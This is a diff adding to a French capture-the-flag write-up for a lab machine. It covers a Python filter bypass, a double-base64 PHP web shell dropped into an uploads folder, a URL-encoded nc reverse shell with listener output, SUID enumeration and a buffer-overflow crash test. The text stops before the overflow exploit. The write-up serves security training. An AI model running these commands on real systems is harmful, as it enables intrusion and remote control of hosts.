@@ -171,3 +171,73 @@ Et lorsque nous exécutons le code `PHP`, il m'affiche un code que je mettrai da
 J'ai essayé de faire un `reverse shell` avec le module `os` mais lorsque je tente d'importer le module `os` il me renvoie `Please, don't use malicious code.`. Donc, j'ai réussi à contourner cela en fesant simplement `__import__('os')` et ensuite en appelant le nom de la fonction `system();` donc `__import__('os').system('whoami')`.
 
 ![test](https://raw.githubusercontent.com/0ldProgrammer/pic/main/Screenshot_2021-02-08_12-07-15.png)
+
+Donc, j'ai créer un fichier PHP dans le dossier `/var/www/dev/uploads/includes/php/uploads/ex75.php` avec la commande `__import__('os').system('echo UEQ5d2FIQWdaV05vYnlCemVYTjBaVzBvSkY5U1JWRlZSVk5VV3lKamJXUWlYU2s3SUQ4Kw==|base64 -d|base64 -d > /var/www/dev/includes/php/uploads/ex75.php')`
+
+J'ai encodé deux fois pour la simple et bonne raison que il y a des caractères que la platforme accepte pas comme `+`, `/` etc.. Donc j'ai encodé deux fois pour que il me l'écrit dans le dossier `uploads`.
+
+Donc lorsque j'exécute la commande : 
+
+    root@wildcodeschool# curl http://dev.oauth.wcs/includes/php/uploads/ex75.php?cmd=id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+Donc, nous avons juste à faire un reverse shell avec la commande et aussi de l'`urlencode` :
+
+    root@wildcodeschool# curl http://dev.oauth.wcs/includes/php/uploads/ex75.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20172.11.111.18%204242%20%3E%2Ftmp%2Ff
+    
+Et en retour nous avons :
+
+    root@wiidcodeschool# nc -lvnp 4242
+    listening on [any] 4242 ...
+    connect to [172.11.111.18] from (UNKNOWN) [192.168.1.253] 21030
+    /bin/sh: 0: can't access tty; job control turned off
+    $ python3 -c "import pty;pty.spawn('/bin/bash')"
+    www-data@checkpoint04:/var/www/dev/includes/php/uploads$ id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+   
+# Privesc
+
+Lorsque nous cherchons les fichiers `SUID`, nous pouvons voir un fichier atypique qui se nomme `ovrflw`.
+
+    www-data@checkpoint04:/$ find / -perm -4000 -print 2>/dev/null
+    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    /usr/lib/openssh/ssh-keysign
+    /usr/lib/eject/dmcrypt-get-device
+    /usr/bin/ovrflw <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+    /usr/bin/sudo
+    /usr/bin/newgrp
+    /usr/bin/traceroute6.iputils
+    /usr/bin/chfn
+    /usr/bin/passwd
+    /usr/bin/chsh
+    /usr/bin/gpasswd
+    /bin/umount
+    /bin/fusermount
+    /bin/ntfs-3g
+    /bin/mount
+    /bin/ping
+    /bin/su
+    
+Si je lui passe des arguments il me renvoie ce que j'ai écris :
+
+    www-data@checkpoint04:/$ /usr/bin/ovrflw aaaaa
+    Your name : aaaaa
+    
+Si je vais essayer de déborder la mémoire en mettant une valeur importante dans l'argument par exemple 500 A.
+
+    www-data@checkpoint04:/$ /usr/bin/ovrflw $(python -c 'print "A"*500')
+    Your name : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+    Segmentation fault
+    
+Il me renvoie bien une Segmentation fault, nous pouvons exploiter cette faille pour pop un shell dans le système, avant de passer à l'exploitation, voyons si l'ASLR est activé et les aspects sécurités du programme si par exemple la pile est exécutable.
+
+    www-data@checkpoint04:/$ cat /proc/sys/kernel/randomize_va_space 
+    1
+
+Nous pouvons voir que par défaut dans le système la valeur est égal à 1, ce qui veut dire que le système randomisera les adresses mémoires à chaque exécution du programme ce qui nous compliquera la tâche de l'exploitation.
+
+Nous pouvons également voir que la version du programme est un programme en 32-bit donc les adresses seront plus faciles à cracker.
+
+    www-data@checkpoint04:/$ file /usr/bin/ovrflw 
+    /usr/bin/ovrflw: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4fb690fc7b9847b11c5eca9764a919972cc7d8c9, not stripped
+    
